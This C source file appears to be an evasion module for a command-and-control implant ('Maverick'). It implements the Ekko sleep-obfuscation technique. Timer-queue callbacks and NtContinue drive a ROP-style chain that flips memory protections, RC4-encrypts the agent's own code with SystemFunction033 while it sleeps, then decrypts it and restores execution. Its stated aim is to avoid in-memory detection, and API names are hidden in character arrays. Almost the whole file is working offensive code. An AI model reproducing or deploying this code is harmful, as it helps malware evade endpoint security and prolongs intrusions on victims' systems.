/*
 * Maverick — Ekko Obfuscation Module (PICO)
 *
 * Timer-queue based sleep with memory encryption. While the agent sleeps,
 * its module memory is encrypted to avoid in-memory detection.
 *
 * ROP chain (executed via timer queue timers + NtContinue):
 *   1. VirtualProtect → PAGE_READWRITE (make code writable)
 *   2. SystemFunction033 (RC4) → encrypt module memory
 *   3. WaitForSingleObject → sleep for the requested duration
 *   4. SystemFunction033 (RC4) → decrypt module memory
 *   5. VirtualProtect → PAGE_EXECUTE_READWRITE (restore executable)
 *   6. SetEvent → signal completion
 *
 * go() signature matches OBFUSCATION_FUNC in entry.c.
 * Based on the Ekko technique by @C5pिder.
 */

#include <windows.h>

#define NtCurrentProcess()      ((HANDLE)(LONG_PTR)-1)

typedef struct {
	DWORD   Length;
	DWORD   MaximumLength;
	PVOID   Buffer;
} USTRING;

WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateTimerQueue(VOID);
WINBASEAPI BOOL WINAPI KERNEL32$CreateTimerQueueTimer(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$SetEvent(HANDLE);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateEventW(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);

WINBASEAPI VOID NTAPI NTDLL$RtlCaptureContext(PCONTEXT);
WINBASEAPI NTSTATUS NTAPI NTDLL$NtContinue(PCONTEXT, BOOLEAN);

void CopyContextRegisters(CONTEXT *dst, CONTEXT *src) {
	dst->ContextFlags = src->ContextFlags;
	dst->Rax = src->Rax;  dst->Rcx = src->Rcx;
	dst->Rdx = src->Rdx;  dst->Rbx = src->Rbx;
	dst->Rsp = src->Rsp;  dst->Rbp = src->Rbp;
	dst->Rsi = src->Rsi;  dst->Rdi = src->Rdi;
	dst->R8  = src->R8;   dst->R9  = src->R9;
	dst->R10 = src->R10;  dst->R11 = src->R11;
	dst->R12 = src->R12;  dst->R13 = src->R13;
	dst->R14 = src->R14;  dst->R15 = src->R15;
	dst->Rip = src->Rip;
}

void EkkoObfuscation(char * start_addr, int size, int sleep_time) {
	CONTEXT CtxThread = { 0 };
	CtxThread.ContextFlags = CONTEXT_ALL;

	CONTEXT *RopProtRW = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	CONTEXT *RopMemEnc = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	CONTEXT *RopDelay  = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	CONTEXT *RopMemDec = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	CONTEXT *RopProtRX = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	CONTEXT *RopSetEvt = (CONTEXT *)KERNEL32$VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);

	HANDLE  hTimerQueue = NULL;
	HANDLE  hNewTimer = NULL;
	HANDLE  hEvent = NULL;
	PVOID   ImageBase = NULL;
	DWORD   ImageSize = 0;
	DWORD   OldProtect = 0;
	DWORD   SleepTime = 0;

	PVOID   NtContinue = NTDLL$NtContinue;

	CHAR KeyBuf[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
	                     0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };
	USTRING Key = { 0 };
	USTRING Img = { 0 };

	hTimerQueue = KERNEL32$CreateTimerQueue();
	hEvent      = KERNEL32$CreateEventW(0, 0, 0, 0);

	ImageBase = start_addr;
	ImageSize = (DWORD)size;
	SleepTime = (DWORD)sleep_time;

	Key.Length = 16;
	Key.MaximumLength = 16;
	Key.Buffer = KeyBuf;

	Img.Length = ImageSize;
	Img.MaximumLength = ImageSize;
	Img.Buffer = ImageBase;

	char cryptsp[] = {'c','r','y','p','t','s','p','.','d','l','l',0};
	char sf033[]   = {'S','y','s','t','e','m','F','u','n','c','t','i','o','n','0','3','3',0};
	HMODULE hCryptsp = KERNEL32$LoadLibraryA(cryptsp);
	PVOID pSysFunc033 = (PVOID)KERNEL32$GetProcAddress(hCryptsp, sf033);

	if (KERNEL32$CreateTimerQueueTimer(
		&hNewTimer, hTimerQueue,
		(WAITORTIMERCALLBACK)NTDLL$RtlCaptureContext,
		&CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD))
	{
		KERNEL32$WaitForSingleObject(hEvent, 0x32);

		if (CtxThread.Rip == 0) return;

		CopyContextRegisters(RopProtRW, &CtxThread);
		CopyContextRegisters(RopMemEnc, &CtxThread);
		CopyContextRegisters(RopDelay,  &CtxThread);
		CopyContextRegisters(RopMemDec, &CtxThread);
		CopyContextRegisters(RopProtRX, &CtxThread);
		CopyContextRegisters(RopSetEvt, &CtxThread);

		RopProtRW->Rsp -= 8;
		RopProtRW->Rip  = (DWORD64)KERNEL32$VirtualProtect;
		RopProtRW->Rcx  = (DWORD64)ImageBase;
		RopProtRW->Rdx  = (DWORD64)ImageSize;
		RopProtRW->R8   = (DWORD64)PAGE_READWRITE;
		RopProtRW->R9   = (DWORD64)&OldProtect;

		RopMemEnc->Rsp -= 8;
		RopMemEnc->Rip  = (DWORD64)pSysFunc033;
		RopMemEnc->Rcx  = (DWORD64)&Img;
		RopMemEnc->Rdx  = (DWORD64)&Key;

		RopDelay->Rsp  -= 8;
		RopDelay->Rip   = (DWORD64)KERNEL32$WaitForSingleObject;
		RopDelay->Rcx   = (DWORD64)NtCurrentProcess();
		RopDelay->Rdx   = (DWORD64)SleepTime;

		RopMemDec->Rsp -= 8;
		RopMemDec->Rip  = (DWORD64)pSysFunc033;
		RopMemDec->Rcx  = (DWORD64)&Img;
		RopMemDec->Rdx  = (DWORD64)&Key;

		RopProtRX->Rsp -= 8;
		RopProtRX->Rip  = (DWORD64)KERNEL32$VirtualProtect;
		RopProtRX->Rcx  = (DWORD64)ImageBase;
		RopProtRX->Rdx  = (DWORD64)ImageSize;
		RopProtRX->R8   = (DWORD64)PAGE_EXECUTE_READWRITE;
		RopProtRX->R9   = (DWORD64)&OldProtect;

		RopSetEvt->Rsp -= 8;
		RopSetEvt->Rip  = (DWORD64)KERNEL32$SetEvent;
		RopSetEvt->Rcx  = (DWORD64)hEvent;

		KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
		KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
		KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD);
		KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD);
		KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD);
		KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, NtContinue, RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD);

		KERNEL32$WaitForSingleObject(hEvent, INFINITE);
	}
}

void go(char * start_addr, int size, int time) {
	EkkoObfuscation(start_addr, size, time);
}
